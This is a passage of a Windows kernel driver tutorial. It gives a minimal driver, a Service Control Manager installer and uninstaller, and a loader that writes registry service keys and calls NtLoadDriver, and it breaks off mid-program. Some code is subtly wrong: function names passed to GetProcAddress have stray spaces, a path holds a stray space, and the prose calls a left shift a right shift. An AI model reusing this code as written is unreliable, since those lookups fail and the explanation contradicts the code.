<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload (PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading...\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IoDeleteSymbolicLink(&amp;gSymbolicLinkName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IoDeleteDevice(gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gDeviceName,L&quot;\\Device\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gSymbolicLinkName,L&quot;\\DosDevices\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IoCreateDevice(driverObject,0,&amp;gDeviceName,FILE_DEVICE_UNKNOWN,0,0,&amp;gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IoCreateSymbolicLink(&amp;gSymbolicLinkName,
&amp;gDeviceName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
11&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>There
is nothing new about our driver code and this will be used as our base.
Sometimes we will only have code in the DriverEntry function, sometimes in the
DriverDispatcher function as we will be passing parameters to our driver from
userland. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>The
name of the device created by our driver is vijayd. Each time our driver is
unloaded, which we will see how to do, the DriverUnload member decides which
function gets called. In our case function DriverUnload get called. Here we
simply delete the device and symbolic link that we have created. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>z.bat<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>cl
y.c advapi32.lib<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>Smallest
batch file, all that we do is pass the lib file advapi32.lib.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>y.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#include
&lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#include
&lt;process.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>SC_HANDLE
m,s;HANDLE g;long b;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
DRV_NAME &quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
DRV_FILENAME &quot;vijay.sys&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
DIRECTORY &quot;C:\\driverm1&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>int
main(int argc, char* argv[])<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>if(argv[1][1]
== 'i')<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>m=OpenSCManager(0,0,SC_MANAGER_ALL_ACCESS
);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>CreateService(m,&quot;vijay&quot;,&quot;mukhi&quot;,SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,DIRECTORY&quot;\\&quot;DRV_FILENAME,0,0,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>s=OpenService(m,&quot;vijay&quot;,SERVICE_ALL_ACCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>StartService(s,
0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>g=CreateFile(&quot;\\\\.\\&quot;DRV_NAME,GENERIC_READ
| GENERIC_WRITE,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DeviceIoControl(g,3
&lt;&lt; 2,(void *) 0,0,0,0,&amp;b,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>if(argv[1][1]=='u')<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>SERVICE_STATUS
ss;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>SC_HANDLE
sh;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>SC_HANDLE
rh;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>sh
= OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>rh
= OpenService(sh,&quot;vijay&quot;,SERVICE_ALL_ACCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>ControlService
(rh, SERVICE_CONTROL_STOP , &amp;ss);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DeleteService(rh);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>In
the function main we check whether the user has type I or u as the second
character of argv[1]. If it is I, the we install the program as before. We will
explain later why we right shift the number 2 or control code passed. The name
of the driver, its location and physical file name are stored as hash defines
so that we can change it at one place. The service name is however vijay and
will remain so.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>When
we uninstall the driver, we first open the SC manager and then the service
vijay. We then use the function ControlService to send the command
SERVICE_CONTROL_STOP to the service. Rh is the handle to the service vijay. Now
that we have stopped the service, the function DeleteService will actually
remove all the registry entries and unload the driver for us. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>To
test things out, we first run the Debug Viewer from sys internals. Running y –I
installs the driver and displays three lines for us telling us what all got
called. Then running y –u calls function DriverUnload in the driver for us. We
make a change in one the DbgPrint and then b.bat and once again y –I and y –u.
This show us the new change made in the Debug Viewer. This only proves that the
new driver code got called.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>y.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#include
&lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#include
&lt;malloc.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#include
&lt;tlhelp32.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
DRV_NAME &quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
DRV_FILENAME &quot;vijay.sys&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
DIRECTORY &quot;C:\\driverm&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>typedef
struct<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>Length;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>MaximumLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>char
* Buffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}
ANSI_STRING, *PANSI_STRING;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>typedef
struct <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>Length;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>MaximumLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short *Buffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}
UNICODE_STRING, *PUNICODE_STRING;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>long
(_stdcall * _RtlAnsiStringToUnicodeString)(PUNICODE_STRING<span
style="mso-spacerun: yes">  </span>DestinationString,PANSI_STRING<span
style="mso-spacerun: yes">  </span>SourceString,unsigned char);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>VOID
(_stdcall *_RtlInitAnsiString)(PANSI_STRING<span style="mso-spacerun: yes"> 
</span>DestinationString,char *<span style="mso-spacerun: yes"> 
</span>SourceString);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>long
(_stdcall *_ZwLoadDriver)(PUNICODE_STRING DriverServiceName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>long
(_stdcall * _ZwUnloadDriver)(PUNICODE_STRING DriverServiceName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>ANSI_STRING
aStr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING
uStr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>HMODULE
hntdll;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>unsigned
long byteRet;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>HANDLE
hDevice;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>HKEY
hkey;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DWORD
val;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>char
*imgName = &quot;System32\\DRIVERS\\&quot;DRV_FILENAME;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>void
main(int argc, char* argv[])<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>hntdll
= GetModuleHandle(&quot;ntdll.dll&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>_ZwLoadDriver
= GetProcAddress(hntdll, &quot;NtLoadDriver&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>_ZwUnloadDriver
= GetProcAddress(hntdll, &quot;NtUnloadDriver&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>_RtlAnsiStringToUnicodeString
= GetProcAddress(hntdll, &quot; RtlAnsiStringToUnicodeString &quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>_RtlInitAnsiString
= GetProcAddress(hntdll, &quot; RtlInitAnsiString &quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>if
( strcmp(argv[1],&quot;-i&quot;) == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>CopyFile(DIRECTORY&quot;\\&quot;DRV_FILENAME,&quot;
C:\\winnt\\system32\\drivers \\&quot;DRV_FILENAME,1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>RegCreateKey
(HKEY_LOCAL_MACHINE,&quot;System\\CurrentControlSet\\Services\\
&quot;DRV_NAME,&amp;hkey);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>val
= 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>RegSetValueEx
(hkey, &quot;Type&quot;, 0, REG_DWORD, (PBYTE)&amp;val, sizeof(val));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,
&quot;ErrorControl&quot;, 0, REG_DWORD, (PBYTE)&amp;val, sizeof(val));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>val
= 3;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,
&quot;Start&quot;, 0, REG_DWORD, (PBYTE)&amp;val, sizeof(val));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,&quot;ImagePath&quot;,0,REG_EXPAND_SZ,(PBYTE)imgName,strlen(imgName));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>_RtlInitAnsiString(&amp;aStr,&quot;
\\Registry\\Machine\\System\\CurrentControlSet\\Services\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>_RtlAnsiStringToUnicodeString
(&amp;uStr, &amp;aStr, TRUE);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>_
ZwLoadDriver (&amp;uStr);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>hDevice
= CreateFile(&quot;\\\\.\\&quot;DRV_NAME, GENERIC_WRITE | GENERIC_READ,
FILE_SHARE_READ | FILE_SHARE_WRITE,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
NULL);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DeviceIoControl(hDevice,
2, 0, 0, 0, 0, &amp;byteRet, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>if
( strcmp(argv[1],&quot;-u&quot;) == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
